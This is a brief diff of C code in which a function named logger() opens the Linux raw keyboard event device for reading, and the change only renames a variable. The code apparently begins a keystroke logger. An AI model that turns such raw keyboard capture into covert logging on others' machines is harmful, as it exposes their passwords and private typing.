@@ -11,9 +11,9 @@
 #define str_len 100
 
 int logger(){
-    const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
+    const char *kbin = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
     int fd;
-    fd  = open(dev, O_RDONLY); /* open buffer */
+    fd  = open(kbin, O_RDONLY); /* open buffer */
     
     if(fd == -1){ 
         return -2;
